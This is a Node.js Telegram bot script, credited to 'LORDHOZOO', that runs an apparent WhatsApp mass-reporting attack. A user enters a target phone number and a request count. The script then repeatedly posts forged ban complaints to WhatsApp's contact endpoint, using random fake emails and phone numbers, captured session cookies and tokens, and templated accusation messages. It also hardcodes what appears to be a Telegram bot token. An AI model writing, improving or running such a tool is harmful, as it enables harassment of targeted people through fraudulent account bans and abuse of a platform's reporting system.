const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const token = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(token, {polling: true});
const colors = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    cyan: "\x1b[36m",
    white: "\x1b[37m"
};
console.log(colors.cyan + "Created by >>LORDHOZOO<< 2025/04/30" + colors.reset);
let replacementNumber = '';
let banMessages = [];
let unbanMessages = [];
let numRequests = 0;
try {
    banMessages = JSON.parse(fs.readFileSync('message_ban_whatsapp.json', 'utf8'));
    unbanMessages = JSON.parse(fs.readFileSync('message_unban_whatsapp.json', 'utf8'));
} catch (err) {
    console.error(colors.red + "Error loading message templates:" + colors.reset, err);
}
function isValidCountryCode(phoneNumber) {
    const pattern = /^\+\d{1,4}\d{10,12}$/;
    return pattern.test(phoneNumber);
}
function generateRandomEmail() {
    const length = 10;
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return `${result}@gmail.com`;
}
function generateRandomPhone(countrySelector) {
    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
    switch(countrySelector) {
        case "EG": return `+20${rand(1, 3)}${rand(100000000, 999999999)}`;
        case "US": return `+1${rand(1000000000, 9999999999)}`;
        case "KR": return `+82${rand(100000000, 999999999)}`;
        case "CN": return `+86${rand(100000000, 999999999)}`;
        case "IN": return `+62${rand(1000000000, 9999999999)}`;
        default: return "0123456789";
    }
}
async function sendRequests(chatId) {
    try {
        const phones = fs.readFileSync('phones.db', 'utf8').split('\n').filter(Boolean);
        const ips = fs.readFileSync('ips.db', 'utf8').split('\n').filter(Boolean);
        const countries = ["EG", "US", "KR", "CN", "IN"];
        const platforms = ["ANDROID", "IPHONE", "WHATS_APP_WEB_DESKTOP", "KAIOS", "OTHER"];
        const messages = banMessages.map(item => ({
            ...item,
            message: item.message.replace("[###]", replacementNumber)
        }));
        const url = "https://www.whatsapp.com/contact/noclient/async/new/";
        for (let i = 0; i < numRequests; i++) {
            try {
                const randomPhone = phones[Math.floor(Math.random() * phones.length)];
                const randomIp = ips[Math.floor(Math.random() * ips.length)];
                const randomItem = messages[Math.floor(Math.random() * messages.length)];
                const countrySelector = countries[Math.floor(Math.random() * countries.length)];
                const data = {
                    country_selector: countrySelector,
                    email: generateRandomEmail(),
                    email_confirm: generateRandomEmail(),
                    phone_number: generateRandomPhone(countrySelector),
                    platform: platforms[Math.floor(Math.random() * platforms.length)],
                    your_message: randomItem.subject + "%A0" + randomItem.message,
                    step: "articles",
                    __user: "0",
                    __a: Math.floor(Math.random() * 1000000000),
                    __req: Math.random() * 10,
                    __hs: "20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0",
                    dpr: "1",
                    __ccg: "UNKNOWN",
                    __rev: Math.floor(Math.random() * 10000000000),
                    __s: "ugvlz3%3A6skj2s%3A4yux6k",
                    __hsi: Math.floor(Math.random() * 10000000000000000000),
                    __dyn: "7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu",
                    __csr: "",
                    lsd: "AVpbkNjZYpw",
                    jazoest: `20000${Math.floor(Math.random() * 90000) + 10000}`
                };
                const headers = {
                    "Host": "www.whatsapp.com",
                    "Cookie": "wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz",
                    "Sec-Ch-Ua-Platform": '"Linux"',
                    "Accept-Language": "en-US,en;q=0.9",
                    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "X-Asbd-Id": "129477",
                    "X-Fb-Lsd": "AVpbkNjZYpw",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "*/*",
                    "Origin": "https://www.whatsapp.com",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.whatsapp.com/contact/noclient?",
                    "Accept-Encoding": "gzip, deflate, br"
                };
                const response = await axios.post(url, data, { headers });
                if (response.status === 200) {
                    const logMessage = `request:(${i+1}) device?:${randomPhone} IP:${randomIp} -> Email:${data.email} | Phone:${countrySelector} ${data.phone_number} | Attck -> ${replacementNumber}`;
                    console.log(`${colors.red}request:${colors.green}(${i+1}) ${colors.red}device?:${colors.green}${randomPhone} ${colors.red}IP:${colors.green}${randomIp} ${colors.blue}-> ${colors.white}Email:${data.email} | Phone:${countrySelector} ${data.phone_number} | Attck -> ${replacementNumber}`);
                    fs.appendFileSync("logs.txt", response.data + "\n");
                    if ((i + 1) % 10 === 0 || i + 1 === numRequests) {
                        await bot.sendMessage(chatId, `Progress: ${i + 1}/${numRequests} requests completed\nLast request: ${logMessage}`);
                    }
                } else {
                    console.log(`${colors.red}${randomIp} ${i+1} - Request failed with status code: ${response.status}`);
                }
                await new Promise(resolve => setTimeout(resolve, 10000));
            } catch (error) {
                console.error(`${colors.red}Request ${i + 1} failed: ${error.message}`);
            }
        }
        await bot.sendMessage(chatId, `✅ All ${numRequests} requests completed successfully!`);
    } catch (error) {
        console.error(colors.red + "Error in sendRequests:" + colors.reset, error);
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            keyboard: [
                [{ text: '🚀 Start Attack' }],
                [{ text: '⚙️ Settings' }, { text: 'ℹ️ Help' }]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
    bot.sendMessage(chatId, 'Welcome to WhatsApp Account Ban/Unban Bot!\n\nPlease choose an option:', options);
});
bot.onText(/🚀 Start Attack/, async (msg) => {
    const chatId = msg.chat.id;
    await bot.sendMessage(chatId, '📱 +62 nomor indonesia contoh kak lord hozoo:');
    bot.once('message', async (msg) => {
        if (isValidCountryCode(msg.text)) {
            replacementNumber = msg.text;
            await bot.sendMessage(chatId, `✅ T: ${replacementNumber}`);
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔴 Ban Account', callback_data: 'ban' }],
                        [{ text: '🟢 Unban Account', callback_data: 'unban' }]
                    ]
                }
            };
            await bot.sendMessage(chatId, 'Choose action:', options);
        } else {
            await bot.sendMessage(chatId, '❌  salah yang bener+62');
        }
    });
});
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const action = callbackQuery.data;
    if (action === 'ban' || action === 'unban') {
        await bot.answerCallbackQuery(callbackQuery.id, { text: `You selected ${action}` });
        await bot.sendMessage(chatId, '🔢 Enter the number of requests to send:');
        bot.once('message', async (msg) => {
            const input = parseInt(msg.text);
            if (!isNaN(input) && input > 0) {
                numRequests = input;
                await bot.sendMessage(chatId, `✅ Starting ${action} attack with ${numRequests} requests...`);
                await sendRequests(chatId);
            } else {
                await bot.sendMessage(chatId, '❌ Harap masukkan angka valid yang lebih besar dari 62.');
            }
        });
    }
});
bot.onText(/⚙️ Settings/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📝 Edit Ban Messages', callback_data: 'edit_ban' }],
                [{ text: '📝 Edit Unban Messages', callback_data: 'edit_unban' }],
                [{ text: '🔄 Update IP List', callback_data: 'update_ips' }],
                [{ text: '🔄 Update Phone List', callback_data: 'update_phones' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'Settings Menu:', options);
});
bot.onText(/ℹ️ Help/, (msg) => {
    const chatId = msg.chat.id;
    const helpText = `🤖 WhatsApp Account Ban/Unban Bot Help:
🚀 Mulai Serangan - Mulai proses serangan
⚙️ Setelan - Konfigurasikan setelan bot
ℹ️ Bantuan - Tampilkan pesan bantuan ini

Cara penggunaan:
1. Klik "Mulai Serangan"
2. Masukkan nomor telepon target dengan kode negara
3. Pilih Blokir atau Batalkan Blokir
4. Masukkan jumlah permintaan
5. Tunggu hingga selesai

Dibuat oleh EXECUTOR LORDHOZOO - 2025`;
    bot.sendMessage(chatId, helpText);
});
console.log('Bot is running...');
